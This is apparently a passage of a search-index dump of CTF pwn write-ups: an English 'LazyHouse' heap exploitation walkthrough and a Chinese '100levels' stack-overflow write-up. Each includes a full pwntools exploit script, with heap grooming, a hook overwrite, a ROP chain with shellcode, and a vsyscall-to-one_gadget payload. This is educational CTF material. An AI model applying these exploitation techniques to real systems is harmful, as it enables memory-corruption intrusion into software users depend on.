for i in range(0, 7): buy_house(7, 0x90, \\x11 * 0x90) sell(7) Then, I fill the tcache of size (0x90 + 0x10) up, and I make 4 chunk of this size, which will be free into unsorted bins. for i in range(0, 7): buy_house(7, 0x90, \\x11 * 0x90) sell(7) #unsorted bin buy_house(4, 0x90, \\x44 * 0x90) buy_house(5, 0x90, \\x55 * 0x90) buy_house(6, 0x90, \\x66 * 0x90) buy_house(7, 0x90, \\x77 * 0x90) Than, I free the chunk(the size of which is overwrite with 0x8d1) at 0x15d0. So a big unsorted bin is list. sell(1) Then, I calloc the chunk of (0x8d0 - 0x10) to get the chunk again. Which is the most import is that, we then free the chunk of house 4 and house 6 to make them into unsorted bins. buy_house(1, 0x8c0, \\xbb * 0xa0 + p64(0) + p64(0xa1) + \\xcc * 0x90 + p64(0) + p64(0xa1) + \\xdd * 0x90 + (p64(0) + p64(0xa1) + \\x11 * 0x90) * 7 + p64(0) + p64(0xa1) + \\x44 * 0x90 + p64(0) + p64(0xa1) + \\x55 * 0x90 + p64(0) + p64(0xa1) + \\x66 * 0x90 + p64(0) + p64(0xa1) + \\x77 * 0x90 ) #pause() sell(4) sell(6) And show house 1 to get heap address and libc address . #leak show_house(1, reading = False) for i in range(0, 10): ru(p64(0xa1)) leaked_libc = u64(p.read(8)) leaked_heap = u64(p.read(8)) libc_base = leaked_libc - 0x1e4ca0 heap_base = leaked_heap - 0x1d60 log.critical( libc_base -- {} .format(hex(libc_base))) log.critical( heap_base -- {} .format(hex(heap_base)))","title":"Leak"},{"location":"pwn/Heap/LazyHouse/#house-of-lore","text":"I use house of lore to fuck the tcache struct in heap range to reach the goal of arbitrary writing. Firstly, I sell the bit chunk and buy the chunk to change the value overlapped by this chunk. This is really usefull in the consistance that we can only upgrade houses for twice. By modifying chunks, we can make the change the size of the chunk of house 2 to 0x21 and the size of the chunk of house 7 to 0x31. sell(1) buy_house(1, 0x8c0, \\xbb * 0xa0 + p64(0) + p64(0x21) + \\xcc * 0x10 + p64(0) + p64(0xa1 - 0x20) + \\x00 * (0x90 - 0x20) + p64(0) + p64(0xa1) + \\xdd * 0x90 + (p64(0) + p64(0xa1) + \\x11 * 0x90) * 7 + p64(0) + p64(0xa1) + p64(libc_base + 0x1e4d40 - 0x10) + p64(heap_base + 0x1d60) + \\x44 * 0x80 + p64(0) + p64(0x21) + \\x55 * 0x10 + p64(0) + p64(0xa1 - 0x20) + \\x00 * (0x90 - 0x20) + p64(0) + p64(0xa1) + p64(heap_base + 0x1c20) + p64(libc_base + 0x1e4d40 - 0x10) + \\x66 * 0x80 + p64(0) + p64(0x31) + p64(heap_base + 0x40) * 4 + p64(0) + p64(0xa1 - 0x30) + \\x00 * (0x90 - 0x30) ) #prepare for house of lore sell(2) sell(7) sell(1) After we free the chunk of house 2 and the chunk of house 7 , we get 2 bin pointer at heap_base + 0x50, which is quite useful for house of lore attack. We sell the chunk of house 1 , that big chunk, for further making a small bin at the address of that 0x21 tcache chunk. (The pointer in tcache struct is chunk + 0x10 ) We buy a chunk, the size of which is (0xb0 + 0x10), to make the top chunk start at the address of that 0x21 tcache bin. GREAT~ buy_house(1, 0xb0, \\x11 * 0xb0) Obtain the small bin in smallbins to clean the smallbins. buy_house(2, 0x90, \\x22 * 0x90) Obtain a size of 0x220 at the address of that 0x21 tcache bin. buy_house(6, 0x217, \\x66 * 0x90) So, it is good for the check for smallbins list. p- BK- prev == p . We then get a smallbin chunk to avoid being merging with top_chunk. buy_house(4, 0x217, \\x44 * 0x90) A great trick. We calloc a (0x3a0 + 0x10) size chunk and free it into tcache to make the bitmap to be 0x100. It is really usefull for this challenge, since we can only use calloc , we need to zero memory with the size of the fake chunk (0 is really not good). buy_house(6, 0x3a0, p64(heap_base + 0x40) * (0x3a0 / 8)) sell(6) Then we make the second overflow to do house of lore attack, modify p- bk to fake_chunk . upgrade(1, \\x22 * 0xb0 + p64(0) + p64(0xa1) + p64(libc_base + 0x1e4d30) + p64(heap_base + 0x40)) Which is still important is that we need to make p- bk- bk- prev == p- bk . Do you remember that we have a tcache bin of 0x30? Good. We just need to set the fd of that chunk to be heap_base + 0x40 . The great trick of setting bitmap to 0x100 has aslo meet that requirement. buy_house(6, 0x3a0, p64(heap_base + 0x40) * (0x3a0 / 8)) At last, we just need to calloc the modified bin out and then we will get the chunk at heap_base + 0x40 , which is the struct of tcache. We can change the header of the tcache bin list whose size is 0x220 to __calloc_hook and buy a big house (use malloc). We can make ROP_CHAIN when we buy the house. It is interesting that when we call __calloc_hook , the register rbp is the same value as size. So, we change __calloc_hook to a Gadget leave; ret to do ROP at the ROP_CHAIN by calloc( heap_chunk + ?).","title":"House of Lore"},{"location":"pwn/Heap/LazyHouse/#exp","text":"from pwn import * local=1 pc= ./lazyhouse aslr=True context.log_level= debug context.word_size = 64 context.os = linux context.endian = little libc=ELF( ./libc.so.6 ) if local==1: #p = process(pc,aslr=aslr,env={ LD_PRELOAD : ./ld-linux-x86-64.so.2 , LD_LIBRARY_PATH : ./ }) p = process(pc,aslr=aslr) #gdb.attach(p, b malloc_printerr ) else: remote_addr=[ 6.6.6.6 , 6666] p=remote(remote_addr[0],remote_addr[1]) ru = lambda x : p.recvuntil(x) sn = lambda x : p.send(x) rl = lambda : p.recvline() sl = lambda x : p.sendline(x) rv = lambda x : p.recv(x) sa = lambda a,b : p.sendafter(a,b) sla = lambda a,b : p.sendlineafter(a,b) def lg(s,addr): print( \\033[1;31;40m%20s-- 0x%x\\033[0m %(s,addr)) def raddr(a=6): if(a==6): return u64(rv(a).ljust(8, \\x00 )) else: return u64(rl().strip( \\n ).ljust(8, \\x00 )) def buy_house(index, size, buf, logging = False): ru( Your choice: ) log.info( target price -- {price} .format(price = hex(size * 0xDA 0xffffffffffffffff))) sl( 1 ) ru( Your money: ) money_now = int(rl().strip()) log.info( money_now -- {money_now} .format(money_now = hex(money_now))) ru( Index: ) sl(str(index)) ru( Size: ) sl(str(size)) ru( Price: ) log.info( price -- {price} .format(price = hex(int(rl().strip())))) if logging == True: return if(p.read(6) != House: ): rl() log.critical( fucked a really big house ) return sn(buf) def show_house(index, reading = True): ru( Your choice: ) sl( 2 ) ru( Index: ) sl(str(index)) if reading == True: return ru( $$$$$$$$$$$$$$$$$$$$$$$$$$$$ )[:-len( $$$$$$$$$$$$$$$$$$$$$$$$$$$$ )] def upgrade(index, buf): ru( Your choice: ) sl( 4 ) ru( Index: ) sl(str(index)) ru( House: ) sn(buf) def sell(index): ru( Your choice: ) sl( 3 ) ru( Index: ) sl(str(index)) def check_money(): ru( Your choice: ) sl( 1 ) ru( Your money: ) money_now = int(rl().strip()) #log.critical( money_now -- {money} .format(money = hex(money_now))) ru( Index: ) sl( 7 ) ru( Size: ) sl(str(0x10)) #log.critical( max calloc -- {money} .format(money = hex(money_now / 0xda))) return money_now def buy_super(buf): ru( Your choice: ) sl( 5 ) ru( House: ) sn(buf) def show_super(): ru( Your choice: ) sl( 6 ) ru( Here is supper house:\\n ) return p.read(0x217) def fuck_money(size): buy_house(7, size, \\x00 ) sell(7) log.critical(hex(check_money())) if __name__ == __main__ : fuck_money(0x13f69b02593f69b1) fuck_money(0x109bb0727572e2bd) fuck_money(0x13f2b1389a662c33) fuck_money(0x4fcace18cee3091) #make tcache size 0x217 full for i in range(0, 7): buy_house(7, 0x217, \\x00 ) sell(7) #chunk after tcache and before tmp tcache bins buy_house(2, 0x80, x * 0x10) sell(2) buy_house(0, 0x400, \\xaa * 0x400) buy_house(1, 0xa0, \\xbb * 0xa0) buy_house(2, 0x90, \\xcc * 0x90) buy_house(3, 0x90, \\xdd * 0x90) #overlapping first upgrade(0, \\xaa * 0x400 + p64(0) + p64(0x8d1)) for i in range(0, 7): buy_house(7, 0x90, \\x11 * 0x90) sell(7) #unsorted bin buy_house(4, 0x90, \\x44 * 0x90) buy_house(5, 0x90, \\x55 * 0x90) buy_house(6, 0x90, \\x66 * 0x90) buy_house(7, 0x90, \\x77 * 0x90) #a big chunk sell(1) #pause() buy_house(1, 0x8c0, \\xbb * 0xa0 + p64(0) + p64(0xa1) + \\xcc * 0x90 + p64(0) + p64(0xa1) + \\xdd * 0x90 + (p64(0) + p64(0xa1) + \\x11 * 0x90) * 7 + p64(0) + p64(0xa1) + \\x44 * 0x90 + p64(0) + p64(0xa1) + \\x55 * 0x90 + p64(0) + p64(0xa1) + \\x66 * 0x90 + p64(0) + p64(0xa1) + \\x77 * 0x90 ) #pause() sell(4) sell(6) #leak show_house(1, reading = False) for i in range(0, 10): ru(p64(0xa1)) leaked_libc = u64(p.read(8)) leaked_heap = u64(p.read(8)) libc_base = leaked_libc - 0x1e4ca0 heap_base = leaked_heap - 0x1d60 log.critical( libc_base -- {} .format(hex(libc_base))) log.critical( heap_base -- {} .format(hex(heap_base))) sell(1) #pause() buy_house(1, 0x8c0, \\xbb * 0xa0 + p64(0) + p64(0x21) + \\xcc * 0x10 + p64(0) + p64(0xa1 - 0x20) + \\x00 * (0x90 - 0x20) + p64(0) + p64(0xa1) + \\xdd * 0x90 + (p64(0) + p64(0xa1) + \\x11 * 0x90) * 7 + p64(0) + p64(0xa1) + p64(libc_base + 0x1e4d40 - 0x10) + p64(heap_base + 0x1d60) + \\x44 * 0x80 + p64(0) + p64(0x21) + \\x55 * 0x10 + p64(0) + p64(0xa1 - 0x20) + \\x00 * (0x90 - 0x20) + p64(0) + p64(0xa1) + p64(heap_base + 0x1c20) + p64(libc_base + 0x1e4d40 - 0x10) + \\x66 * 0x80 + p64(0) + p64(0x31) + p64(heap_base + 0x40) * 4 + p64(0) + p64(0xa1 - 0x30) + \\x00 * (0x90 - 0x30) ) #prepare for house of lore sell(2) sell(7) sell(1) buy_house(1, 0xb0, \\x11 * 0xb0) buy_house(2, 0x90, \\x22 * 0x90) buy_house(6, 0x217, \\x66 * 0x90) buy_house(4, 0x217, \\x44 * 0x90) sell(6) #set bitmap to 0x100 buy_house(6, 0x3a0, p64(heap_base + 0x40) * (0x3a0 / 8)) sell(6) pause() #house of lore upgrade(1, \\x22 * 0xb0 + p64(0) + p64(0xa1) + p64(libc_base + 0x1e4d30) + p64(heap_base + 0x40)) libc.address = libc_base malloc_hook = libc.symbols[ __malloc_hook ] mprotect = libc.symbols[ mprotect ] leave_ret = libc_base + 0x0000000000058373 pop_rdi_ret = libc_base + 0x0000000000026542 pop_rsi_ret = libc_base + 0x0000000000026f9e pop_rdx_ret = libc_base + 0x000000000012bda6 call_rdx = libc_base + 0x0000000000143650 ROP_CHAIN = p64(pop_rdi_ret) + p64(heap_base) + \\ p64(pop_rsi_ret) + p64(0x4000) + \\ p64(pop_rdx_ret) + p64(7) + p64(mprotect) + \\ p64(pop_rdx_ret) + p64(heap_base + 0x1780) + p64(call_rdx) ROP_CHAIN = ROP_CHAIN.ljust(0x1700 - 0x16a0, \\x90 ) ROP_CHAIN += /flag\\0 ROP_CHAIN = ROP_CHAIN.ljust(0x1780 - 0x16a0, \\x90 ) buffer_addr = heap_base + 0x1700 heap_addr = heap_base + 0x2000 code = asm(pwnlib.shellcraft.amd64.linux.open(buffer_addr, 0, 2).replace( push SYS_open , push 2 )) code += asm(pwnlib.shellcraft.amd64.linux.syscall( SYS_read , rax , heap_addr, 0x100)) code += asm(pwnlib.shellcraft.amd64.linux.syscall( SYS_write , 1 , heap_addr, 0x100).replace( push SYS_write , push 1 )) code += asm(pwnlib.shellcraft.amd64.linux.syscall( SYS_exit , 0)) ROP_CHAIN += code buy_house(6, 0x217, ROP_CHAIN) buy_house(7, 0x217, p64(malloc_hook) * 0x40) buy_super(p64(leave_ret) * 2) sell(1) buy_house(1, heap_base + 0x16a0 - 8, ROP_CHAIN, logging = True) p.interactive()","title":"EXP"},{"location":"pwn/Stackoverflow/100levels/","text":"100levels WP \u62ff\u5230\u9898\u76ee\u5148\u770b\u9632\u62a4\u673a\u5236 \u53d1\u73b0\u5f00\u4e86PIE\uff0c\u8fd9\u662f\u6700\u8ba9\u4eba\u5934\u75db\u7684\u9632\u62a4\u673a\u5236\uff0c\u8fd9\u5c31\u610f\u5473\u7740\u6211\u4eec\u9700\u8981\u60f3\u529e\u6cd5\u83b7\u5f97\u4e00\u4e2alibc\u4e2d\u7684\u51fd\u6570\u7684\u5730\u5740\u624d\u884c\u3002\u63a5\u7740\u5206\u6790\u7a0b\u5e8f\u903b\u8f91 \u7a0b\u5e8f\u6709\u4e24\u4e2a\u4e3b\u8981\u6a21\u5757\uff0c\u4e00\u4e2a\u6e38\u620f\u6a21\u5757\uff0c\u4e00\u4e2a\u63d0\u793a\u6a21\u5757\u3002\u6e38\u620f\u6a21\u5757\u662f\u8fdb\u884c\u4e24\u6b21\u8f93\u5165\uff0c\u7136\u540e\u5c06\u4e24\u6b21\u7684\u503c\u76f8\u52a0\uff0c\u5f97\u51fa\u4f60\u9700\u8981\u8fdb\u884c\u7684\u6e38\u620f\u5173\u5361\u6570\uff0c\u540c\u65f6\u8fd9\u4e2a\u5173\u5361\u6570\u6700\u5927\u4e0d\u8d85\u8fc7100\u3002hint\u6a21\u5757\u5219\u662f\u5224\u65adhint_flag\u8fd9\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u4e3a1\u5219\u8f93\u51fasystem\u51fd\u6570\u7684\u8fd0\u884c\u65f6\u5730\u5740\u3002\u4f46\u662fhint_flag\u59cb\u7ec8\u4e3a0\uff0c\u6240\u4ee5\u53ef\u4ee5\u8003\u8651\u4fee\u6539\u8fd9\u4e2a\u503c\u6765\u83b7\u5f97system\u51fd\u6570\u5730\u5740\u3002 \u5206\u6790\u6e38\u620f\u6a21\u5757\uff0c\u53ef\u4ee5\u5f88\u660e\u663e\u5730\u770b\u5230\u6709\u4e00\u4e2a\u6808\u6ea2\u51fa\u7684\u70b9 \u4f46\u662f\u82e6\u4e8ePIE\uff0c\u800c\u4e14\u6e38\u620f\u4e00\u65e6\u5f00\u59cb\uff0c\u65e0\u8bba\u8f93\u8d62\u6700\u540e\u90fd\u4f1a\u7ed3\u675f\u8fdb\u7a0b\uff0c\u5b8c\u5168\u60f3\u4e0d\u5230\u4efb\u4f55\u5bf9\u6808\u653b\u51fb\u7684\u65b9\u6cd5\uff0c\u6240\u4ee5\u53ea\u80fd\u5c06\u5e0c\u671b\u5bc4\u6258\u4e8ehint\u6a21\u5757\uff0c\u5148\u60f3\u529e\u6cd5\u83b7\u53d6system\u51fd\u6570\u7684\u5730\u5740\u3002\u56e0\u4e3ahint_flag\u662f\u5728\u5806\u4e0a\uff0c\u53c8\u6ca1\u6709\u60f3\u5230\u4ec0\u4e48\u9488\u5bf9\u5806\u7684\u8f93\u5165\uff0c\u6240\u4ee5\u653e\u5f03\u8fd9\u91cc\u3002 \u63a5\u4e0b\u6765\u5c31\u662f\u5f88\u5173\u952e\u7684\u4e00\u70b9\u4e86\uff0c\u8fd9\u91cc\u7684\u6f0f\u6d1e\u4e0d\u5206\u6790\u6c47\u7f16\u4ee3\u7801\u662f\u770b\u4e0d\u51fa\u6765\u7684\u3002 \u901a\u8fc7\u5206\u6790hint\u6a21\u5757\uff0c\u6211\u4eec\u53d1\u73b0\u65e0\u8bbahint_flag\u7684\u503c\u4e3a\u591a\u5c11\uff0csystem\u51fd\u6570\u7684\u5730\u5740\u90fd\u4f1a\u88ab\u5b58\u653e\u5728\u6808\u4e0arbp+110\u7684\u5730\u65b9\u4e0a\uff0c\u5c31\u662f\u8bf4\u6808\u4e0a\u662f\u6709system\u51fd\u6570\u7684\u5730\u5740\u7684\u3002\u8fd9\u5c31\u5f88\u597d\u4e86\uff0c\u5c31\u662f\u8bf4\u901a\u8fc7\u6808\u6211\u4eec\u6709\u529e\u6cd5\u83b7\u5f97\u9700\u8981\u7684\u4e1c\u897f\uff0c\u4e0d\u518d\u662f\u50cf\u524d\u9762\u90a3\u6837\u6beb\u65e0\u60f3\u6cd5\u4e86\u3002 \u7136\u540e\u6211\u4eec\u518d\u8fd4\u56de\u53bb\u770bgame\u6a21\u5757 \u7136\u540e\u6211\u4eec\u56de\u5fc6\u4e0b\u7a0b\u5e8f\u7684\u8c03\u7528\u6d41\u7a0b\uff0c\u6211\u4eec\u5b8c\u5168\u53ef\u4ee5\u8fd9\u6837\u8c03\u7528\uff1amenu- call hint()- ret menu- call game() \u8fd9\u6837\u4e00\u6765\uff0cgame\u4e0ehint\u7684\u6808\u5e27\u5c06\u4e00\u6837\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0cgame\u6a21\u5757\u7684rbp+110\u504f\u79fb\u5904\u7684\u503c\u5c06\u4f1a\u662fhint\u6a21\u5757\u7684rbp+110\u504f\u79fb\u5904\u7684\u503c\u3002\u4e5f\u5c31\u662f\u8bf4\uff0csystem\u51fd\u6570\u7684\u5730\u5740\u5c06\u88ab\u56fa\u5b9a\u5728game\u6a21\u5757\u7684\u6808\u4e2d\uff01\uff01\u8fd9\u5c31\u5f88\u597d\u4e86\uff0c\u56e0\u4e3a\u867d\u7136hint\u6a21\u5757\u6ca1\u6709\u518d\u6b21\u8c03\u7528\u51fd\u6570\uff0c\u4e5f\u5c31\u662f\u6ca1\u6709\u529e\u6cd5\u901a\u8fc7\u6808\u6ea2\u51faret\u5230system\u51fd\u6570\u7684\u4f4d\u7f6e\uff0c\u4f46\u662fgame\u6a21\u5757\u8c03\u7528\u4e86play()\u51fd\u6570\uff0c\u800c\u4e14play\u51fd\u6570\u4e2d\u6709\u6808\u6ea2\u51fa\u7684\u6f0f\u6d1e\u53ef\u4ee5\u5229\u7528 \u3002 \u7136\u540e\u63a5\u4e0b\u6765\u7684\u95ee\u9898\u5c31\u53d8\u6210\u4e86\u600e\u4e48\u5229\u7528\u8fd9\u4e2a\u6808\u4e0a\u7684system\u51fd\u6570\u5730\u5740\u3002\u8fd9\u91cc\u53ef\u4ee5\u60f3\u5230\u7cfb\u7edf\u6ed1\u677f\u3002 \u5148\u628a\u8fd9\u4e2a\u6808\u4e0a\u7684\u5927\u6982\u5185\u5bb9\u6574\u7406\u4e00\u4e0b \u521d\u6b65\u7684\u60f3\u6cd5\u662f\u76f4\u63a5\u8fd4\u56de\u5230system\u51fd\u6570\u5904\uff0c\u4f46\u662f\u8fd9\u4e2asystem\u51fd\u6570\u5e76\u4e0d\u5728play\u51fd\u6570\u7684ret\u5904\uff0c\u6240\u4ee5\u9700\u8981\u501f\u52a9\u4e00\u4e2a\u6ed1\u677f\u6ed1\u5230sys_addr\u5904\u3002\u8fd9\u91cc\u5c31\u53ef\u4ee5\u7528\u5230vsyscall()\u6765\u5145\u5f53\u8fd9\u4e2a\u6ed1\u677f\u3002 \u73b0\u4ee3\u7684Windows/*Unix\u64cd\u4f5c\u7cfb\u7edf\u90fd\u91c7\u7528\u4e86\u5206\u7ea7\u4fdd\u62a4\u7684\u65b9\u5f0f\uff0c\u5185\u6838\u4ee3\u7801\u4f4d\u4e8eR0\uff0c\u7528\u6237\u4ee3\u7801\u4f4d\u4e8eR3\u3002\u8bb8\u591a\u5bf9\u786c\u4ef6\u548c\u5185\u6838\u7b49\u7684\u64cd\u4f5c\u90fd\u4f1a\u88ab\u5305\u88c5\u6210\u5185\u6838\u51fd\u6570\u5e76\u63d0\u4f9b\u4e00\u4e2a\u63a5\u53e3\u7ed9\u7528\u6237\u5c42\u4ee3\u7801\u8c03\u7528\uff0c\u8fd9\u4e2a\u63a5\u53e3\u5c31\u662f\u6211\u4eec\u719f\u77e5\u7684int 0x80/syscall+\u8c03\u7528\u53f7\u6a21\u5f0f\u3002\u5f53\u6211\u4eec\u6bcf\u6b21\u8c03\u7528\u8fd9\u4e2a\u63a5\u53e3\u65f6\uff0c\u4e3a\u4e86\u4fdd\u8bc1\u6570\u636e\u7684\u9694\u79bb\uff0c\u6211\u4eec\u9700\u8981\u628a\u5f53\u524d\u7684\u4e0a\u4e0b\u6587(\u5bc4\u5b58\u5668\u72b6\u6001\u7b49)\u4fdd\u5b58\u597d\uff0c\u7136\u540e\u5207\u6362\u5230\u5185\u6838\u6001\u8fd0\u884c\u5185\u6838\u51fd\u6570\uff0c\u7136\u540e\u5c06\u5185\u6838\u51fd\u6570\u8fd4\u56de\u7684\u7ed3\u679c\u653e\u7f6e\u5230\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\u548c\u5185\u5b58\u4e2d\uff0c\u518d\u6062\u590d\u4e0a\u4e0b\u6587\uff0c\u5207\u6362\u5230\u7528\u6237\u6a21\u5f0f\u3002\u8fd9\u4e00\u8fc7\u7a0b\u9700\u8981\u8017\u8d39\u4e00\u5b9a\u7684\u6027\u80fd\u3002\u5bf9\u4e8e\u67d0\u4e9b\u7cfb\u7edf\u8c03\u7528\uff0c\u5982gettimeofday\u6765\u8bf4\uff0c\u7531\u4e8e\u4ed6\u4eec\u7ecf\u5e38\u88ab\u8c03\u7528\uff0c\u5982\u679c\u6bcf\u6b21\u88ab\u8c03\u7528\u90fd\u8981\u8fd9\u4e48\u6765\u56de\u6298\u817e\u4e00\u904d\uff0c\u5f00\u9500\u5c31\u4f1a\u53d8\u6210\u4e00\u4e2a\u7d2f\u8d58\u3002\u56e0\u6b64\u7cfb\u7edf\u628a\u51e0\u4e2a\u5e38\u7528\u7684\u65e0\u53c2\u5185\u6838\u8c03\u7528\u4ece\u5185\u6838\u4e2d\u6620\u5c04\u5230\u7528\u6237\u7a7a\u95f4\u4e2d\uff0c\u8fd9\u5c31\u662fvsyscall\u3002 vsyscall\u7684\u5730\u5740\u5e76\u4e0d\u53d7PIE\u7684\u5f71\u54cd\uff0c\u59cb\u7ec8\u57280xffffffffff600000-0xffffffffff601000\u5904\uff0c\u800c\u4e14\u603b\u5171\u6709\u4e09\u4e2a\uff0c\u4ece\u4f4e\u5730\u5740\u5230\u9ad8\u5730\u5740\u5206\u522b\u662fgettimeofday, time\u548cgetcpu\u3002 \u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cvsyscall\u6267\u884c\u65f6\u4f1a\u8fdb\u884c\u68c0\u67e5\uff0c\u5982\u679c\u4e0d\u662f\u4ece\u51fd\u6570\u5f00\u5934\u6267\u884c\u7684\u8bdd\u5c31\u4f1a\u51fa\u9519\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u552f\u4e00\u7684\u9009\u62e9\u5c31\u662f\u5229\u75280xffffffffff600000, 0xffffffffff600400, 0xffffffffff600800\u8fd9\u4e09\u4e2a\u5730\u5740\u3002\u56e0\u4e3a\u8fd9\u4e09\u4e2a\u4f4d\u7f6e\u662f\u6b7b\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u5c31\u7528\u8fd9\u4e09\u4e2a\u6765\u505a\u6ed1\u677f\uff0c\u6ed1\u5230sysaddr\u90a3\u91cc\u3002 \u5206\u6790\u6808\u5e03\u5c40\uff0c\u6784\u9020\u6211\u4eec\u7684exp\u3002 \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\uff0c\u6211\u4eec\u8fd9\u6837\u76f8\u5f53\u4e8e\u4f1a\u628asys_addr\u548c\u7b2c\u4e8c\u6b21\u8f93\u5165\u7684\u503c\u76f8\u52a0\u5f97\u5230\u6700\u7ec8\u7684\u5173\u5361\u6570\uff0c\u4e0a\u9650\u662f100\u3002\u6240\u4ee5\u6211\u4eec\u540e\u9762\u8fd8\u8981\u5b8c\u621099\u6b21\u7684\u7b54\u9898\uff0c\u7136\u540e\u5728\u6700\u540e\u4e00\u6b21\u5b9e\u73b0\u6808\u6ea2\u51fa\u3002\u4f46\u662f\u8fd8\u6709\u4e00\u70b9\u5c31\u662f\uff0c\u8fd9\u91cc\u6211\u4eec\u53ea\u6709system\u7684\u5730\u5740\uff0c\u8fd8\u6ca1\u6709\u653e\u597d\u53c2\u6570\u3002\u4f46\u662f\u60f3\u8981\u653e\u597d\u53c2\u6570\u6709\u9700\u8981\u76f4\u5230\u7a0b\u5e8f\u7684\u52a0\u8f7d\u5730\u5740\uff0c\u4ee5\u6784\u9020ROP\u94fe\u3002\u6240\u4ee5\u6211\u4eec\u5e72\u8106\u4e0d\u8c03\u7528system\u51fd\u6570\uff0c\u76f4\u63a5\u8c03\u7528libc\u4e2d\u7684one_gadget\u3002\u6240\u4ee5\u8fd8\u9700\u8981\u8ba1\u7b97system\u51fd\u6570\u7684\u5730\u5740\u548cone_gadget\u7684\u5730\u5740\u4e4b\u5dee\uff0c\u7136\u540e\u4ee4\u5176\u52a0\u548c\u3002 \u6700\u540e\u5199\u51faexp from pwn import * context . log_level = True p = process ( ./100levels ) #p = remote( 111.198.29.45 , 53167) elf = ELF ( ./100levels ) one_gadget = 0x45216 sys_addr = 0x45390 offset = one_gadget - sys_addr vsys_addr = 0xffffffffff600007 def hint (): print p . recvuntil ( Choice: \\n ) p . sendline ( 2 ) print p . recvuntil ( NO PWN NO FUN \\n ) def play (): print p . recvuntil ( Question: ) a = p . recvuntil ( ) a = a [: - 1 ] a = int ( a , 10 ) print p . recvuntil ( * ) b = p . recvuntil ( ) b = b [: - 1 ] b = int ( b , 10 ) print p . recvuntil ( Answer: ) p . sendline ( str ( a * b )) def boom (): payload = a * 0x30 + a * 8 + p64 ( vsys_addr ) * 3 print p . recvuntil ( Answer: ) p . send ( payload ) def game (): print p . recvuntil ( Choice: \\n ) p . sendline ( 1 ) print p . recvuntil ( How many levels? \\n ) p . sendline ( -1 ) print p . recvuntil ( Any more? \\n ) p . sendline ( str ( offset )) print p . recvuntil ( Let s go! \\n ) for i in range ( 99 ): play () boom () p . interactive () if __name__ == __main__ : hint () game ()","title":"100levels"},{"location":"pwn/Stackoverflow/100levels/#100levels-wp","text":"\u62ff\u5230\u9898\u76ee\u5148\u770b\u9632\u62a4\u673a\u5236 \u53d1\u73b0\u5f00\u4e86PIE\uff0c\u8fd9\u662f\u6700\u8ba9\u4eba\u5934\u75db\u7684\u9632\u62a4\u673a\u5236\uff0c\u8fd9\u5c31\u610f\u5473\u7740\u6211\u4eec\u9700\u8981\u60f3\u529e\u6cd5\u83b7\u5f97\u4e00\u4e2alibc\u4e2d\u7684\u51fd\u6570\u7684\u5730\u5740\u624d\u884c\u3002\u63a5\u7740\u5206\u6790\u7a0b\u5e8f\u903b\u8f91 \u7a0b\u5e8f\u6709\u4e24\u4e2a\u4e3b\u8981\u6a21\u5757\uff0c\u4e00\u4e2a\u6e38\u620f\u6a21\u5757\uff0c\u4e00\u4e2a\u63d0\u793a\u6a21\u5757\u3002\u6e38\u620f\u6a21\u5757\u662f\u8fdb\u884c\u4e24\u6b21\u8f93\u5165\uff0c\u7136\u540e\u5c06\u4e24\u6b21\u7684\u503c\u76f8\u52a0\uff0c\u5f97\u51fa\u4f60\u9700\u8981\u8fdb\u884c\u7684\u6e38\u620f\u5173\u5361\u6570\uff0c\u540c\u65f6\u8fd9\u4e2a\u5173\u5361\u6570\u6700\u5927\u4e0d\u8d85\u8fc7100\u3002hint\u6a21\u5757\u5219\u662f\u5224\u65adhint_flag\u8fd9\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u4e3a1\u5219\u8f93\u51fasystem\u51fd\u6570\u7684\u8fd0\u884c\u65f6\u5730\u5740\u3002\u4f46\u662fhint_flag\u59cb\u7ec8\u4e3a0\uff0c\u6240\u4ee5\u53ef\u4ee5\u8003\u8651\u4fee\u6539\u8fd9\u4e2a\u503c\u6765\u83b7\u5f97system\u51fd\u6570\u5730\u5740\u3002 \u5206\u6790\u6e38\u620f\u6a21\u5757\uff0c\u53ef\u4ee5\u5f88\u660e\u663e\u5730\u770b\u5230\u6709\u4e00\u4e2a\u6808\u6ea2\u51fa\u7684\u70b9 \u4f46\u662f\u82e6\u4e8ePIE\uff0c\u800c\u4e14\u6e38\u620f\u4e00\u65e6\u5f00\u59cb\uff0c\u65e0\u8bba\u8f93\u8d62\u6700\u540e\u90fd\u4f1a\u7ed3\u675f\u8fdb\u7a0b\uff0c\u5b8c\u5168\u60f3\u4e0d\u5230\u4efb\u4f55\u5bf9\u6808\u653b\u51fb\u7684\u65b9\u6cd5\uff0c\u6240\u4ee5\u53ea\u80fd\u5c06\u5e0c\u671b\u5bc4\u6258\u4e8ehint\u6a21\u5757\uff0c\u5148\u60f3\u529e\u6cd5\u83b7\u53d6system\u51fd\u6570\u7684\u5730\u5740\u3002\u56e0\u4e3ahint_flag\u662f\u5728\u5806\u4e0a\uff0c\u53c8\u6ca1\u6709\u60f3\u5230\u4ec0\u4e48\u9488\u5bf9\u5806\u7684\u8f93\u5165\uff0c\u6240\u4ee5\u653e\u5f03\u8fd9\u91cc\u3002 \u63a5\u4e0b\u6765\u5c31\u662f\u5f88\u5173\u952e\u7684\u4e00\u70b9\u4e86\uff0c\u8fd9\u91cc\u7684\u6f0f\u6d1e\u4e0d\u5206\u6790\u6c47\u7f16\u4ee3\u7801\u662f\u770b\u4e0d\u51fa\u6765\u7684\u3002 \u901a\u8fc7\u5206\u6790hint\u6a21\u5757\uff0c\u6211\u4eec\u53d1\u73b0\u65e0\u8bbahint_flag\u7684\u503c\u4e3a\u591a\u5c11\uff0csystem\u51fd\u6570\u7684\u5730\u5740\u90fd\u4f1a\u88ab\u5b58\u653e\u5728\u6808\u4e0arbp+110\u7684\u5730\u65b9\u4e0a\uff0c\u5c31\u662f\u8bf4\u6808\u4e0a\u662f\u6709system\u51fd\u6570\u7684\u5730\u5740\u7684\u3002\u8fd9\u5c31\u5f88\u597d\u4e86\uff0c\u5c31\u662f\u8bf4\u901a\u8fc7\u6808\u6211\u4eec\u6709\u529e\u6cd5\u83b7\u5f97\u9700\u8981\u7684\u4e1c\u897f\uff0c\u4e0d\u518d\u662f\u50cf\u524d\u9762\u90a3\u6837\u6beb\u65e0\u60f3\u6cd5\u4e86\u3002 \u7136\u540e\u6211\u4eec\u518d\u8fd4\u56de\u53bb\u770bgame\u6a21\u5757 